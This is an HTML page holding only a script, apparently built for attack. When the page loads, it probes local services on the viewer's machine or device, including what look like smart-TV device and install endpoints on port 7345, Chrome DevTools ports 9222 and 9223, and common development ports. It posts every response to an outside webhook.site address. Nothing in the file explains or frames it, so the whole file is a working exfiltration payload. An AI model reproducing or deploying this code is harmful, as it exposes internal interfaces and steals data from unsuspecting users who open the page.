<!DOCTYPE html>
<html>
<head><meta charset="utf-8"></head>
<body>
<script>
const EXFIL = 'https://webhook.site/f223977d-60e6-4b93-8ae2-201d550e29c0';

async function send(data) {
  try {
    await fetch(EXFIL, {
      method: 'POST',
      mode: 'no-cors',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(data)
    });
  } catch(e) {}
}

async function probe(url, opts) {
  try {
    const r = await fetch(url, opts || {});
    const body = await r.text();
    return {url, status: r.status, body: body.slice(0, 3000)};
  } catch(e) {
    return {url, error: e.toString()};
  }
}

async function main() {
  send({status: 'alive', ua: navigator.userAgent});

  const targets = [
    'http://127.0.0.1:7345/state/device/deviceinfo',
    'http://127.0.0.1:7345/scpl/install',
    'http://127.0.0.1:7345/scpl/update/override_group',
    'http://127.0.0.1:7345/scpl/status',
    'http://127.0.0.1:7345/menu_native/dynamic/tv_settings/system',
    'http://127.0.0.1:8012/',
    'http://127.0.0.1:9223/json',
    'http://127.0.0.1:9223/json/version',
    'http://127.0.0.1:9222/json',
    'http://127.0.0.1:10101/',
    'http://127.0.0.1:80/',
    'http://127.0.0.1:8080/',
    'http://127.0.0.1:3000/',
    'http://127.0.0.1:5000/',
    'http://127.0.0.1:1080/',
  ];

  for (const url of targets) {
    const result = await probe(url);
    send(result);
    await new Promise(r => setTimeout(r, 300));
  }

  send({status: 'probe_complete'});
}

main();
</script>
</body>
</html>
